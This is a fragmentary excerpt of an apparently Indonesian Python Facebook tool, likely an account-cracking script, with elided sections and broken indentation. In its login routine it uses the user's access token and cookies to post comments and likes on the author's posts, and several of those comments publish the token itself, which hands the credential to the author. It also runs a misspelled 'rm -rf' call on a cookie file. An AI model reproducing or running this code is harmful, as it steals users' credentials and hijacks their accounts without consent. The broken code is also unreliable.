...
komenredem = random.choice(['Abang Sayang'])
komtwol = random.choice(['Maaf Bang gua sudah Recode SC lu Bang', 'MR.Riyal,MHD.SYAFII,FIKRI SINAGA', 'BANg KOK LO JAGO BANGET SIH ', ' BANG DAH MAKAN BLM'])
kartu2d = random.choice(["LU GANTENG BANG TAPI SAYANG BELUM PUNYA PACAR", "PRISTYLE DULU BOSSS KUU","AHAHAHAHHA BANYAK KANG RECOD AWAS BANG "])
kon = random.choice(["HACKER ADA DIMANA MANA :)"])
...
def ___fii___Sayang___Kamu___Widiya___():
    try:
        ...
        os.syatem('rm -rf login/cookie.json')
    #    kontol = open("data/token.txt", "r").read()
        menu()
    kom = komenredem
    komentar = komtwol
    pipp = kartu2d
    post = '124531676914056'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/124531676914056/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122173987149825/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122173987149825/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122173987149825/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122682133765677/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/124531676914056/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/124531676914056/likes?summary=true&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122682133765677/likes?summary=true&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122682133765677/likes?summary=true&access_token=' + (token),cookies=cookie)
    menu()
...
def menu():
    ...
    print(f"{B} | ")
    print(f"{B}_________________________________________________")
    print(f"{B} | ")
...
def userset():
    ...
    if _pil_ in ["1","01"]:
        ...
        try:
            ...
            _tes_ua=("Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
        print(f"{B} | ")
...
def started():
    ...
    print(f"{B} | ")
    print(f"{P}[•] Jika Tidak Ada Hasil, Mainkan Mode Pesawat 5 Detik")
    print(f"{B} | {P}")
